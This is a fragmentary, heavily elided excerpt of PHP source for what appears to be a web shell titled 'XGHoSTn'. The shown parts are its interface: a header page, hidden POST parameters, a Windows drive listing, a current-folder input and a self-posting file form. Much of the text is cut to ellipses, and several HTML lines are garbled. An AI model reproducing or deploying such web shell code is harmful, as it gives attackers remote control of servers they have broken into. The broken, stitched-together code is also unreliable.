...
if($os == 'win')
    ...
    function printHeader() {
        ...
        global $color;
?>
<html><head><meta http-equiv='Content-Type' content='text/html; charset=<?php echo $_POST['charset'] ?>'><title>XGHoSTn- <?php echo VERSION ?></title>
...
<input type=hidden name=p4 value='<?php echo isset($_POST['p4']) ? htmlspecialchars($_POST['p4']) : '' ?>'>
...
<?php
        ...
        if ($GLOBALS['os'] == 'win') {
			...
			$drives .=' < ahref = "#"onclick =" g(\ ' .$drive." > ['.$drive.'] < / a >" ;
	}
...
<p align="Left">Folder: <input type=text name=path size=60 value="<?php echo getcwd(); ?>">
...
-----------------------------------------------<br><br> ";
                                                ...
                                                function actionTest() {
                                                    ...
                                                    echo '<br>';
?>
<form action="<?php $_SERVER['PHP_SELF']?>" method=POST onSubmit="g(null,null,this.fname.value);return false;">
